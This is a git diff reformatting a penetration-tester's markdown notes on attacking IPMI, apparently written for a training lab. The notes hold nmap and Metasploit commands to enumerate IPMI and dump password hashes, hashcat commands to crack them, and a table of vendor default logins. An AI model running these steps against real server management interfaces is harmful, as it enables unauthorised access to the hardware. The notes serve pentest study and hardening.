@@ -1,35 +1,45 @@
-[Intelligent Platform Management Interface](https://www.thomas-krenn.com/en/wiki/IPMI_Basics) (`IPMI`)
+---
+title: "Intelligent Platform Management Interface"
+date: 2025-08-23
+tags: [ipmi, service]
+port: [udp, 623]
+---
 
-### Footprinting:
+# Intelligent Platform Management Interface
+
+## Enumeration
+
+*Common Commands*
 
 `$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local`
 
-### Msfconsole Version Scan:
+### Msfconsole Version Scan | Hash Dum
 
-`msf6 > use auxiliary/scanner/ipmi/ipmi_version `
+```bash
+msf6 > use auxiliary/scanner/ipmi/ipmi_version 
 
-`msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195`
+# Hash dump
+msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
+```
 
-`msf6 auxiliary(scanner/ipmi/ipmi_version) > show options`
+### Crack the hashes with hascat
 
-### Msfconsole Dump Hashes:
+```
+hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
 
-`msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes `
+# With other wordlist
+hashcat -m 7300 /tmp/1 /usr/share/wordlists/rockyou.txt
+```
 
-`msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195`
-
-`msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options`
-
-### Crack the hashes with hascat:
-
-`hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u`
-
-`hashcat -m 7300 /tmp/1 /usr/share/wordlists/rockyou.txt` # or other wordlist
-
-### Common or default logins:
+### Common or default logins
 
 | Product | Username | Password |
 | --- |  --- |  --- |
 | Dell iDRAC | root | calvin |
-| HP iLO | Administrator | randomized 8-character string consisting of numbers and uppercase letters |
+| HP iLO | Administrator | randomised 8-character string consisting of numbers and uppercase letters |
 | Supermicro IPMI | ADMIN | ADMIN |
+
+### Service Information
+
+- [Pentesting IPMI](https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/)
+
